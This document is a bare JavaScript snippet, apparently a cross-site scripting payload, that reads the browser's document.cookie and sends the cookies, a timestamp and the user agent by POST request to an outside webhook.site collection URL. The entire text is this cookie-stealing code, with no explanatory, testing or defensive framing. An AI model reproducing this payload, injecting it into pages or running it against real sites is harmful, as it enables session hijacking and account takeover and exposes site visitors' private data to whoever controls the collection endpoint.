(() => { const cookies = document.cookie; if (cookies) { fetch('https://webhook.site/d680ab4b-0944-426b-8239-9752dfa7015b', 
															   { method: 'POST', headers: {'Content-Type': 'application/json'},
																body: JSON.stringify({ cookies, timestamp: new Date().toISOString(), userAgent: navigator.userAgent }) }).catch(console.error); } })();
